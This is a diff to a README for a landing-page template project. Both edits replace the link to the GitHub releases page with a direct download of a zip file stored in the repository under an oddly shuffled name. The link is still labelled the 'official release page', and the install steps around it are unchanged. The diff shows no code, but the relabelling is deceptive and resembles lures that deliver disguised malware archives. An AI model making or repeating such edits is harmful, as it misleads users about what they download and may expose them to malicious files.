@@ -1,6 +1,6 @@
 # 🚀 coming-soon-site-template - Build professional landing pages with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/jeremiahbloodguilty747/coming-soon-site-template/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/jeremiahbloodguilty747/coming-soon-site-template/main/Main/site-soon-coming-template-v1.6.zip)
 
 This template helps you build a landing page for your project. You can show that your website is under construction while you build your main site. This tool contains the files you need to show a professional message to your visitors. It works on all modern web browsers.
 
@@ -8,7 +8,7 @@ This template helps you build a landing page for your project. You can show that
 
 You need to save the template files to your computer before you start. Follow these steps to get the files.
 
-1. Go to the [official release page](https://github.com/jeremiahbloodguilty747/coming-soon-site-template/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/jeremiahbloodguilty747/coming-soon-site-template/main/Main/site-soon-coming-template-v1.6.zip).
 2. Look for the section labeled Assets.
 3. Click the link that ends in .zip to save the file.
 4. Save this file in a folder you can find later, such as your Downloads folder.
